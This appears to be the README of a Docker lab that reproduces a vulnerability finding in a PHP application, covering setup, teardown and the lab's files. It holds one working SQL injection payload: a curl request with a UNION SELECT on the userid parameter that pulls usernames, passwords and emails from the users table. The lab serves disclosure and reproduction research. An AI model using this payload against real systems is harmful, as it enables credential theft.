# Reproduction lab

Self-contained Docker environment to reproduce the finding. **Authorized research only** —
it binds to `127.0.0.1` and is not exposed on the network.

```bash
./setup.sh                          # clones the target app, applies DB config
sudo docker-compose up -d --build   # starts web (PHP 8.2 + Apache) + db (MariaDB)
# app:  http://127.0.0.1:8080/
```

Reproduce the vulnerability (see the finding [README](../README.md) for full PoC):

```bash
curl -s "http://127.0.0.1:8080/php_action/fetchSelectedUser.php" \
  --data-urlencode "userid=0 UNION SELECT user_id,username,password,email FROM users-- -"
```

Teardown:

```bash
sudo docker-compose down -v         # stop + wipe DB
```

## Contents
- `docker-compose.yml` — web + db services
- `web.Dockerfile` — PHP 8.2/Apache image with `mysqli`
- `db/store.sql` — database schema + seed (default admin / `MD5("admin")`)
- `app-overrides/php_action/db_connect.php` — points the app at the `db` service
- `setup.sh` — fetches the target app into `./app` (not redistributed in this repo)
